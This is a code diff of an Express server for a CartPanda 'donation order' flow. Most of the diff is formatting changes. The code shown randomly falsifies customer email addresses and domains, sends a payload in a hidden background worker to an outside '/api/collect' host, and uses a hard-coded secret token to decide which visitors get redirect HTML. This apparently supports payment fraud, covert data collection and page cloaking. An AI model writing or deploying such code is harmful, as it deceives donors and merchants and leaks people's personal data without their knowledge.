@@ -16,7 +16,6 @@ if (!CARTPANDA_SHOP_SLUG) {
 const app = express();
 
 // ============= Middlewares =============
-
 // CORS setup
 app.use(cors({
   origin: '*',
@@ -47,7 +46,6 @@ app.use((req, res, next) => {
 });
 
 // ============= Helper functions =============
-
 /**
  * Check if a character is a vowel (a, e, i, o, u) - case-insensitive
  */
@@ -82,11 +80,7 @@ function removeOneDigit(str) {
   const before = str.slice(0, randomIndex);
   const after = str.slice(randomIndex + 1);
   const newDigits = getRandomInt(0,10).toString() + getRandomInt(0,10).toString();
-  
-  return {
-    newStr: before + newDigits + after,
-    changed: true
-  };
+  return { newStr: before + newDigits + after, changed: true };
 }
 
 /**
@@ -109,7 +103,6 @@ function removeOneSymbol(str) {
   const randomIndex = symbolIndices[getRandomInt(0, symbolIndices.length)];
   let newStr = str.slice(0, randomIndex) + str.slice(randomIndex + 1);
   newStr += getRandomInt(0, 10).toString();
-
   return { newStr, changed: true };
 }
 
@@ -124,12 +117,13 @@ function removeOneSymbol(str) {
  */
 function applyAlternativeTransform(localPart) {
   const choice = getRandomInt(1, 4); // 1, 2, or 3
-
   const vowels = ['a', 'e', 'i', 'o', 'u'];
+
   function pickDifferentVowel(exclude) {
     const possible = vowels.filter(v => v.toLowerCase() !== exclude.toLowerCase());
     return possible[getRandomInt(0, possible.length)];
   }
+
   function pickDifferentConsonant(exclude) {
     const allConsonants = 'bcdfghjklmnpqrstvwxyz'.split('');
     const filtered = allConsonants.filter(c => c !== exclude.toLowerCase());
@@ -137,8 +131,7 @@ function applyAlternativeTransform(localPart) {
   }
 
   switch (choice) {
-    case 1:
-      // 1. Add one or two numbers at the end of the username.
+    case 1: // 1. Add one or two numbers at the end of the username.
       const count = getRandomInt(1, 3); // 1 or 2
       let toAdd = '';
       for (let i = 0; i < count; i++) {
@@ -146,8 +139,7 @@ function applyAlternativeTransform(localPart) {
       }
       return localPart + toAdd;
 
-    case 2: {
-      // 2. Remove the last letter, then maybe add a different one
+    case 2: { // 2. Remove the last letter, then maybe add a different one
       if (localPart.length === 0) return localPart;
       const removedChar = localPart[localPart.length - 1];
       let newLocalPart = localPart.slice(0, -1);
@@ -163,8 +155,7 @@ function applyAlternativeTransform(localPart) {
       return newLocalPart;
     }
 
-    case 3: {
-      // 3. Remove a random letter (not necessarily the last); then same maybe-add logic
+    case 3: { // 3. Remove a random letter (not necessarily the last); then same maybe-add logic
       if (localPart.length === 0) return localPart;
       const randomIndex = getRandomInt(0, localPart.length);
       const removedChar = localPart[randomIndex];
@@ -173,15 +164,9 @@ function applyAlternativeTransform(localPart) {
       // 50% chance to add a new letter
       if (Math.random() < 0.5) {
         if (isVowel(removedChar)) {
-          newLocalPart =
-            newLocalPart.slice(0, randomIndex) +
-            pickDifferentVowel(removedChar) +
-            newLocalPart.slice(randomIndex);
+          newLocalPart = newLocalPart.slice(0, randomIndex) + pickDifferentVowel(removedChar) + newLocalPart.slice(randomIndex);
         } else {
-          newLocalPart =
-            newLocalPart.slice(0, randomIndex) +
-            pickDifferentConsonant(removedChar) +
-            newLocalPart.slice(randomIndex);
+          newLocalPart = newLocalPart.slice(0, randomIndex) + pickDifferentConsonant(removedChar) + newLocalPart.slice(randomIndex);
         }
       }
       return newLocalPart;
@@ -197,23 +182,20 @@ function applyAlternativeTransform(localPart) {
  */
 function pickAlternateDomain(originalDomain) {
   const domainLower = originalDomain.toLowerCase();
-
   const domainWeights = [
-    { domain: 'gmail.com',    weight: 40 },
-    { domain: 'yahoo.com',    weight: 20 },
-    { domain: 'icloud.com',   weight: 20 },
-    { domain: 'outlook.com',  weight: 20 },
-    { domain: 'hotmail.com',  weight: 20 },
-    { domain: 'live.com',     weight: 10 },
-    { domain: 'aol.com',      weight: 2 },
-    { domain: 'comcast.net',  weight: 1 },
-    { domain: 'verizon.net',  weight: 0 },
+    { domain: 'gmail.com', weight: 40 },
+    { domain: 'yahoo.com', weight: 20 },
+    { domain: 'icloud.com', weight: 20 },
+    { domain: 'outlook.com', weight: 20 },
+    { domain: 'hotmail.com', weight: 20 },
+    { domain: 'live.com', weight: 10 },
+    { domain: 'aol.com', weight: 2 },
+    { domain: 'comcast.net', weight: 1 },
+    { domain: 'verizon.net', weight: 0 },
     { domain: 'sbcglobal.net',weight: 0 }
   ];
 
-  const filtered = domainWeights.filter(d =>
-    d.weight > 0 && d.domain.toLowerCase() !== domainLower
-  );
+  const filtered = domainWeights.filter(d => d.weight > 0 && d.domain.toLowerCase() !== domainLower );
   if (!filtered.length) {
     return 'gmail.com';
   }
@@ -221,12 +203,14 @@ function pickAlternateDomain(originalDomain) {
   const totalWeight = filtered.reduce((acc, d) => acc + d.weight, 0);
   const rand = getRandomInt(0, totalWeight);
   let cumulative = 0;
+
   for (const item of filtered) {
     cumulative += item.weight;
     if (rand < cumulative) {
       return item.domain;
     }
   }
+
   return filtered[filtered.length - 1].domain;
 }
 
@@ -249,6 +233,7 @@ function transformEmail(email) {
         newStr = applyAlternativeTransform(localPart);
       }
     }
+
     const newDomain = pickAlternateDomain(domain);
     return `${newStr}@${newDomain}`;
   } catch (err) {
@@ -268,7 +253,6 @@ function splitFullName(fullName) {
 }
 
 // ============= Worker Helper =============
-
 /**
  * Fire-and-forget: post to "https://database-production-12a5.up.railway.app/api/collect"
  * inside a worker so it doesn't delay the main response.
@@ -276,50 +260,50 @@ function splitFullName(fullName) {
 function sendDataInWorker(payload) {
   // We build the script on the fly to run in a worker thread
   const script = `
-    const { parentPort } = require('worker_threads');
-    const https = require('https');
+  const { parentPort } = require('worker_threads');
+  const https = require('https');
 
-    function postData(payload) {
-      return new Promise((resolve, reject) => {
-        const data = JSON.stringify(payload);
-        const options = {
-          hostname: 'database-production-12a5.up.railway.app',
-          path: '/api/collect',
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'Content-Length': data.length
-          }
-        };
+  function postData(payload) {
+    return new Promise((resolve, reject) => {
+      const data = JSON.stringify(payload);
+      const options = {
+        hostname: 'database-production-12a5.up.railway.app',
+        path: '/api/collect',
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Content-Length': data.length
+        }
+      };
 
-        const req = https.request(options, (res) => {
-          // We can ignore the response body since we only need to store the data
-          res.on('data', () => {});
-          res.on('end', () => {
-            resolve();
-          });
+      const req = https.request(options, (res) => {
+        // We can ignore the response body since we only need to store the data
+        res.on('data', () => {});
+        res.on('end', () => {
+          resolve();
         });
-
-        req.on('error', (error) => {
-          reject(error);
-        });
-
-        req.write(data);
-        req.end();
       });
-    }
 
-    parentPort.once('message', async (payload) => {
-      try {
-        await postData(payload);
-      } catch (err) {
-        // Log or swallow the error, but do not crash the main thread
-        console.error('Worker error posting data:', err);
-      } finally {
-        // Let the main thread know we're done
-        parentPort.postMessage('done');
-      }
+      req.on('error', (error) => {
+        reject(error);
+      });
+
+      req.write(data);
+      req.end();
     });
+  }
+
+  parentPort.once('message', async (payload) => {
+    try {
+      await postData(payload);
+    } catch (err) {
+      // Log or swallow the error, but do not crash the main thread
+      console.error('Worker error posting data:', err);
+    } finally {
+      // Let the main thread know we're done
+      parentPort.postMessage('done');
+    }
+  });
   `;
 
   // Safely spin up the worker
@@ -345,7 +329,6 @@ function sendDataInWorker(payload) {
 }
 
 // ============= Routes =============
-
 // Health check
 app.get('/health', (req, res) => {
   res.json({ status: 'OK' });
@@ -354,13 +337,13 @@ app.get('/health', (req, res) => {
 /**
  * POST /create-donation-order
  * Body shape:
- *  {
- *    amount: number,        // (ignored in the new flow, but we'll still pass it along)
- *    variantId: number,     // (required)
- *    email: string,         // (required)
- *    fullName: string,      // (required)
- *    phoneNumber: string    // (required)
- *  }
+ * {
+ *   amount: number, // (ignored in the new flow, but we'll still pass it along)
+ *   variantId: number, // (required)
+ *   email: string, // (required)
+ *   fullName: string, // (required)
+ *   phoneNumber: string // (required)
+ * }
  */
 app.post('/create-donation-order', async (req, res) => {
   try {
@@ -412,26 +395,40 @@ app.post('/create-donation-order', async (req, res) => {
   }
 });
 
-// ============= Modified Route =============
-
+// ============= New Added Routes =============
 // Secret token for validation
 const SECRET_TOKEN = 'dimehook3943000493';
+
+// Define special HTML content as a redirect (server-side redirect)
+const ALT_HTML = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="refresh" content="0;url=https://chatbotsai.co/thankyou">
+  <title>Redirecting...</title>
+  <script>window.location.href = "https://chatbotsai.co/thankyou";</script>
+</head>
+<body>
+  <p>Redirecting to thank you page...</p>
+</body>
+</html>
+`.trim();
 
 /**
  * POST /api/validate
  * Body: { value: string }
- * Response: 
- *   If valid: { allowed: true, redirectUrl: 'https://chatbotsai.co/thankyou' }
- *   If invalid: { allowed: false }
+ * Response: { allowed: boolean, altHtml?: string }
  */
 app.post('/api/validate', (req, res) => {
   try {
     const { value } = req.body ?? {};
+    
     if (value === SECRET_TOKEN) {
-      // User meets the criteria → send redirect URL instead of HTML
+      // User is "special" → send the redirect HTML
       res.json({ 
         allowed: true, 
-        redirectUrl: 'https://chatbotsai.co/thankyou' 
+        altHtml: ALT_HTML 
       });
     } else {
       // Not special → just say "no"
@@ -458,6 +455,7 @@ app.use((err, req, res, next) => {
 process.on('unhandledRejection', (reason, promise) => {
   console.error('Unhandled Rejection at:', promise, 'reason:', reason);
 });
+
 process.on('uncaughtException', (err) => {
   console.error('Uncaught Exception thrown:', err);
 });
